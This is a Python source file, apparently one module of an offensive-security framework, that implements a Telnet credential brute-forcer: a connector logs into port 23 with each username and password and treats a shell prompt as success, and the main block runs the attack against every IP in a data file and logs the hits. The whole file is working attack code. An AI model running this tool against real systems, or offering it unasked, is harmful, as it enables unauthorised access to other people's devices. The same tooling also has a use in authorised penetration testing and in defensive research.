import os
import csv
import telnetlib
import threading
import logging
import time
from queue import Queue
from shared import SharedData
from logger import Logger
from actions.base_connector import BaseConnector, BaseBruteforce

logger = Logger(name="telnet_connector.py", level=logging.DEBUG)

b_class = "TelnetBruteforce"
b_module = "telnet_connector"
b_status = "brute_force_telnet"
b_port = 23
b_parent = None

class TelnetBruteforce(BaseBruteforce):
    def __init__(self, shared_data):
        super().__init__(shared_data, TelnetConnector(shared_data))

class TelnetConnector(BaseConnector):
    PORT = 23
    SERVICE_NAME = "Telnet"

    @property
    def output_file(self):
        return self.shared_data.telnetfile

    def connect(self, ip, user, password):
        try:
            tn = telnetlib.Telnet(ip, timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(user.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")
            time.sleep(2)
            response = tn.expect([b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5)
            tn.close()
            return response[0] == 2 or response[0] == 3
        except Exception:
            return False

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        telnet_bruteforce = TelnetBruteforce(shared_data)
        logger.info("Starting Telnet brute-force attack on port 23...")
        ips_to_scan = shared_data.read_data()
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing TelnetBruteforce on {ip}...")
            telnet_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total number of successes: {len(telnet_bruteforce.connector.results)}")
        exit(len(telnet_bruteforce.connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
